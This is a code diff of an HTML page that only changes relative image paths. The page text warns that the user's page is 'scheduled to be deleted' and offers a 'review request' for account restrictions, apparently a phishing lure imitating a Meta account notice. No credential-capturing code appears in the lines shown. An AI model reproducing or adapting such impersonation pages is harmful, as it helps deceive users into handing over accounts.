@@ -283,7 +283,7 @@
             <div class="col-8">
                 <div id="right">
                     <h1>
-                        <img src="./img/block_2.png" alt="" style="height: 40px;
+                        <img src="../../img/block_2.png" alt="" style="height: 40px;
                         width:40px;
                         margin-right: 8px;">
                         We have scheduled your page to be deleted
@@ -303,7 +303,7 @@
 
                     <div class="action-button wide" id="view-accounts" onclick="accountsModal.show()" style="display: none;">
                         <div class="action-button-img">
-                            <img src="./img/no_avatar.png" alt="">
+                            <img src="../../img/no_avatar.png" alt="">
                         </div>
                         <div class="action-button-text">
                             <span>View accounts</span>
@@ -349,7 +349,7 @@
 </style>                    
                     
                     <div id="card">
-                        <img src="./img/banner_new_01.png" alt="">
+                        <img src="../../img/banner_new_01.png" alt="">
                         <div class="card-text">
                             <p class="card-type">Review request</p>
                             <h4>Fixing problems with account restrictions</h4>
@@ -368,7 +368,7 @@
                         <div class="action-button-list">
                             <div class="action-button wide">
                                 <div class="action-button-img">
-                                    <img src="./img/save_img.png" alt="">
+                                    <img src="../../img/save_img.png" alt="">
                                 </div>
                                 <div class="action-button-text">
                                     <span>What is the Privacy Policy and what does it say?</span>
@@ -384,7 +384,7 @@
                             </div>
                             <div class="action-button wide">
                                 <div class="action-button-img">
-                                    <img src="./img/save_img.png" alt="">
+                                    <img src="../../img/save_img.png" alt="">
                                 </div>
                                 <div class="action-button-text">
                                     <span>How you can manage or delete your information</span>
@@ -404,7 +404,7 @@
                         <h6>For more details, see the User Agreement</h6>
                         <div class="action-button wide">
                             <div class="action-button-img">
-                                <img src="./img/doc.png" alt="">
+                                <img src="../../img/doc.png" alt="">
                             </div>
                             <div class="action-button-text">
                                 <span>Meta AI</span>
